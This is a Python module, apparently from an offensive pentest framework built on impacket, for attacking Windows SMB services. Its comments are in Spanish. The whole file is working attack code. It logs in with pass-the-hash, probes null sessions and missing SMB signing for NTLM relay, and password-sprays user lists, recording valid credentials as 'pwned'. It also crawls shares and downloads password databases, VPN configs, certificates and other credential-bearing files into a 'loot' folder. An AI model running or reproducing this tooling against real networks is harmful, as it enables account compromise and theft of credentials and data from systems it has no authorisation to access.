# modules/smb.py

import os
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30
from core.output import print_result, print_table, print_check
from core import session_db

DIALECT_MAP = {
    "v1": SMB_DIALECT,
    "v2": SMB2_DIALECT_002,
    "v2.1": SMB2_DIALECT_21,
    "v3": SMB2_DIALECT_30,
}

DIALECT_NAMES = {
    SMB_DIALECT: "SMBv1",
    SMB2_DIALECT_002: "SMBv2.0",
    SMB2_DIALECT_21: "SMBv2.1",
    SMB2_DIALECT_30: "SMBv3.0",
}

SHARE_TYPES = {
    0: "DISK",
    1: "PRINTER",
    2: "DEVICE",
    3: "IPC",
}

DEFAULT_SPIDER_EXTENSIONS = [
    ".txt", ".config", ".ini", ".xml", ".ps1", ".kdbx", ".cfg",
    ".ovpn", ".rdp", ".bak", ".log", ".json", ".yml", ".pfx"
]
_USE_DEFAULT = object()  # centinela para distinguir "no especificado" de "lista vacía explícita"


class SMBModule:
    def __init__(self, target, creds):
        self.target = target      # instancia de Target
        self.creds = creds        # instancia de Creds
        self.conn = None
        self.dialect_name = None  # se rellena en connect()

    def _proto(self):
        """Devuelve 'SMBv2.1' (o el dialecto que corresponda) si ya se conoce,
        o 'SMB' como fallback antes de conectar."""
        return self.dialect_name or "SMB"

    def connect(self, force_dialect=None):
        """
        Abre la conexión TCP y negocia el dialecto SMB.
        force_dialect: None (auto, deja que el servidor y la librería elijan),
                       o uno de "v1", "v2", "v2.1", "v3" para forzarlo explícitamente.
        No requiere credenciales todavía.
        """
        try:
            preferred = DIALECT_MAP.get(force_dialect) if force_dialect else None
            self.conn = SMBConnection(
                remoteName=self.target.ip,
                remoteHost=self.target.ip,
                timeout=self.target.timeout,
                preferredDialect=preferred
            )
            dialect_used = self.conn.getDialect()
            dialect_name = DIALECT_NAMES.get(dialect_used, str(dialect_used))
            self.dialect_name = dialect_name
            session_db.save_target(self.target.ip, domain=self.target.domain)
            print_result(self._proto(), self.target.ip, "ok", f"conexión establecida, {dialect_name}")
            return True
        except Exception as e:
            self.conn = None
            reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
            print_result(self._proto(), self.target.ip, "fail", f"no se pudo conectar: [bold white]{reason}[/bold white]")
            return False

    def login(self):
        """
        Autentica sobre la conexión ya abierta.
        Si self.creds está vacío (is_null_session), intenta null session.
        Soporta password normal y pass-the-hash.
        """
        if self.conn is None:
            print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa, llama a connect() primero")
            return False

        try:
            if self.creds.hash:
                nthash = self.creds.hash.split(":")[-1]
                self.conn.login(
                    self.creds.user, "", self.creds.domain,
                    lmhash="", nthash=nthash
                )
            else:
                self.conn.login(
                    self.creds.user or "", self.creds.password or "",
                    self.creds.domain or ""
                )

            if self.creds.is_null_session():
                session_db.save_finding(self.target.ip, "SMB", "null_session", "null session permitida vía login()")
                print_result(self._proto(), self.target.ip, "ok", "null session permitida")
            else:
                secret = self.creds.hash if self.creds.hash else self.creds.password
                secret_type = "hash" if self.creds.hash else "password"
                session_db.save_credential(self.target.ip, self.creds.user, secret, secret_type,
                                            valid=True, source="smb_login")
                print_result(self._proto(), self.target.ip, "pwned", f"login correcto como {self.creds.user}")
            return True

        except Exception as e:
            reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
            print_result(self._proto(), self.target.ip, "fail", f"Failed, reason: [bold white]{reason}[/bold white]")
            return False

    def is_null_session(self):
        """
        Comprueba si el objetivo permite null session, sin usar
        ni alterar las credenciales reales del módulo (self.creds).
        Requiere que connect() ya se haya llamado antes.
        """
        if self.conn is None:
            print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa, llama a connect() primero")
            return False

        try:
            self.conn.login("", "", "")
            session_db.save_finding(self.target.ip, "SMB", "null_session", "null session permitida (chequeo standalone)")
            print_result(self._proto(), self.target.ip, "ok", "null session permitida")
            return True
        except Exception as e:
            reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
            print_result(self._proto(), self.target.ip, "fail", f"null session denegada, reason: [bold white]{reason}[/bold white]")
            return False

    def check_signing(self):
        """
        Comprueba si el servidor exige SMB signing (isSigningRequired()).
        No requiere login, solo connect() previo. Si el signing NO es
        obligatorio, el objetivo es potencialmente vulnerable a NTLM relay.
        """
        if self.conn is None:
            print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa, llama a connect() primero")
            return None

        try:
            required = self.conn.isSigningRequired()

            if required:
                detail = "SMB signing obligatorio (protegido contra NTLM relay)"
                session_db.save_finding(self.target.ip, "SMB", "signing_required", detail)
                print_check(detail, ok=True)
            else:
                detail = "SMB signing NO obligatorio (potencialmente vulnerable a NTLM relay)"
                session_db.save_finding(self.target.ip, "SMB", "signing_not_required", detail)
                print_check(detail, ok=False)

            return required

        except Exception as e:
            reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
            print_result(self._proto(), self.target.ip, "fail", f"Failed, reason: [bold white]{reason}[/bold white]")
            return None

    def _decode_share_type(self, share_type):
        base_type = share_type & 0x0FFFFFFF  # los bits bajos indican el tipo base
        is_special = bool(share_type & 0x80000000)  # bit alto = share especial ($ admin)
        name = SHARE_TYPES.get(base_type, f"UNKNOWN({base_type})")
        return f"{name} (special)" if is_special else name

    def list_shares(self, silent=False):
        """
        Lista los shares disponibles usando la sesión ya autenticada
        (o null session). Devuelve la lista además de imprimirla.
        silent=True: no imprime la tabla, solo devuelve los datos (uso interno).
        """
        if self.conn is None:
            if not silent:
                print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa")
            return []

        try:
            shares = self.conn.listShares()
            rows = []
            for share in shares:
                name = share['shi1_netname'][:-1]  # impacket devuelve el nombre con null-byte al final
                share_type = self._decode_share_type(share['shi1_type'])
                comment = share['shi1_remark'][:-1] if share['shi1_remark'] else ""
                rows.append((name, share_type, comment))

            if not silent:
                print_table(f"Shares en {self.target.ip}", ["Nombre", "Tipo", "Comentario"], rows)

            for name, share_type, comment in rows:
                if "special" not in share_type:  # no interesa registrar ADMIN$/C$/IPC$ como hallazgo
                    session_db.save_finding(self.target.ip, "SMB", "share_found", f"{name} ({share_type})")

            return rows

        except Exception as e:
            if not silent:
                reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
                print_result(self._proto(), self.target.ip, "fail", f"Failed, reason: [bold white]{reason}[/bold white]")
            return []

    def list_files(self, share_name, path="", silent=False):
        """
        Lista ficheros y carpetas dentro de una ruta de un share.
        path="" lista la raíz del share. Usa "\\" como separador (estilo Windows).
        silent=True: no imprime la tabla, solo devuelve los datos (uso interno).
        Devuelve una lista de tuplas (nombre, es_directorio, tamaño).
        """
        if self.conn is None:
            if not silent:
                print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa")
            return []

        search_path = path + "\\*" if path else "\\*"

        try:
            entries = self.conn.listPath(share_name, search_path)
            rows = []
            for entry in entries:
                name = entry.get_longname()
                if name in (".", ".."):
                    continue
                is_dir = entry.is_directory()
                size = entry.get_filesize()
                rows.append((name, "Sí" if is_dir else "No", size))

            if not silent:
                print_table(f"{share_name}{path or ''} en {self.target.ip}",
                             ["Nombre", "Directorio", "Tamaño"], rows)
            return rows

        except Exception as e:
            if not silent:
                reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
                print_result(self._proto(), self.target.ip, "fail", f"Failed, reason: [bold white]{reason}[/bold white]")
            return []

    def download_file(self, share_name, remote_path, local_path):
        """
        Descarga un fichero remoto de un share a una ruta local.
        Crea las carpetas locales necesarias si no existen.
        """
        if self.conn is None:
            print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa")
            return False

        try:
            local_dir = os.path.dirname(local_path)
            if local_dir:
                os.makedirs(local_dir, exist_ok=True)
            with open(local_path, "wb") as f:
                self.conn.getFile(share_name, remote_path, f.write)

            print_result(self._proto(), self.target.ip, "pwned", f"descargado: {share_name}\\{remote_path} -> {local_path}")
            session_db.save_finding(self.target.ip, "SMB", "file_downloaded", f"{share_name}\\{remote_path} -> {local_path}")
            return True

        except Exception as e:
            reason = e.getErrorString()[0] if hasattr(e, "getErrorString") else str(e)
            print_result(self._proto(), self.target.ip, "fail", f"error descargando {remote_path}: [bold white]{reason}[/bold white]")
            return False

    def spider_share(self, share_name, path="", extensions=_USE_DEFAULT, keywords=None, max_depth=5, _depth=0):
        """
        Recorre recursivamente un share y descarga automáticamente los
        ficheros que coincidan con una extensión o palabra clave.

        extensions:
            - No se especifica -> usa DEFAULT_SPIDER_EXTENSIONS
            - [] (lista vacía explícita) -> no descarga por extensión, solo por keyword
            - [".foo", ".bar"] -> usa exactamente esas extensiones
        keywords: lista de palabras a buscar en el nombre del fichero, ej: ["password", "backup"]
        max_depth: profundidad máxima de recursión, para no perderse en árboles gigantes.

        Devuelve la lista de rutas locales descargadas.
        """
        if extensions is _USE_DEFAULT:
            extensions = DEFAULT_SPIDER_EXTENSIONS
        elif extensions is None:
            extensions = []

        if _depth == 0:
            ext_info = f"{len(extensions)} extensión(es)" if extensions else "sin filtro de extensión"
            print_result(self._proto(), self.target.ip, "info",
                         f"spidering {share_name}{path or ''}... ({ext_info})")

        if _depth > max_depth:
            return []

        keywords = keywords or []
        downloaded = []

        entries = self.list_files(share_name, path, silent=True)

        for name, is_dir_str, size in entries:
            entry_path = f"{path}\\{name}" if path else f"\\{name}"

            if is_dir_str == "Sí":
                downloaded += self.spider_share(
                    share_name, entry_path, extensions, keywords, max_depth, _depth + 1
                )
                continue

            matches_ext = any(name.lower().endswith(ext.lower()) for ext in extensions)
            matches_keyword = any(kw.lower() in name.lower() for kw in keywords)

            if matches_ext or matches_keyword:
                local_path = os.path.join(
                    "loot", self.target.ip, share_name.strip("\\"),
                    path.strip("\\"), name
                )
                if self.download_file(share_name, entry_path, local_path):
                    downloaded.append(local_path)

        if _depth == 0:
            print_result(self._proto(), self.target.ip, "info",
                         f"spidering completado: {len(downloaded)} fichero(s) descargado(s)")

        return downloaded

    def spider_all_shares(self, extensions=_USE_DEFAULT, keywords=None, max_depth=5, include_special=False):
        """
        Recorre TODOS los shares del objetivo (excepto los especiales como
        ADMIN$/C$/IPC$, salvo que include_special=True) usando spider_share()
        en cada uno. Imprime progreso por share y un resumen final con
        tabla de lo descargado.

        extensions/keywords/max_depth: mismos parámetros que spider_share().
        Devuelve la lista completa de rutas locales descargadas.
        """
        shares = self.list_shares(silent=True)
        if not shares:
            print_result(self._proto(), self.target.ip, "fail", "no se pudieron listar shares para el spidering")
            return []

        all_downloaded = []

        for name, share_type, comment in shares:
            if not include_special and "special" in share_type:
                continue

            print_result(self._proto(), self.target.ip, "info", f"Looking for share: {name}...")
            downloaded = self.spider_share(name, extensions=extensions, keywords=keywords, max_depth=max_depth)
            all_downloaded += downloaded

        if all_downloaded:
            rows = [(os.path.basename(p), p) for p in all_downloaded]
            print_table(f"Ficheros descargados en {self.target.ip}", ["Fichero", "Ruta local"], rows)
        else:
            print_result(self._proto(), self.target.ip, "info", "spidering completo: no se encontró nada que descargar")

        return all_downloaded

    def password_spray(self, users, password, domain=""):
        """
        Prueba una misma contraseña contra una lista de usuarios.
        Reutiliza connect()/login() en bucle, sin necesitar credenciales
        distintas por intento -> por eso se llama "spray" y no "brute force".

        users: lista de nombres de usuario
        password: contraseña única a probar contra todos
        domain: dominio (opcional)

        Devuelve la lista de usuarios para los que el login tuvo éxito.
        """
        print_result(self._proto(), self.target.ip, "info",
                     f"password spray: {len(users)} usuario(s), 1 contraseña")

        valid_users = []

        for user in users:
            spray_creds = type(self.creds)(user=user, password=password, domain=domain)
            spray_module = SMBModule(self.target, spray_creds)

            if spray_module.connect():
                if spray_module.login():
                    valid_users.append(user)
                    session_db.save_credential(self.target.ip, user, password, "password",
                                                valid=True, source="smb_password_spray")

        if valid_users:
            print_result(self._proto(), self.target.ip, "pwned",
                         f"password spray: {len(valid_users)} credencial(es) válida(s) encontrada(s)")
        else:
            print_result(self._proto(), self.target.ip, "info",
                         "password spray: ninguna credencial válida encontrada")

        return valid_users
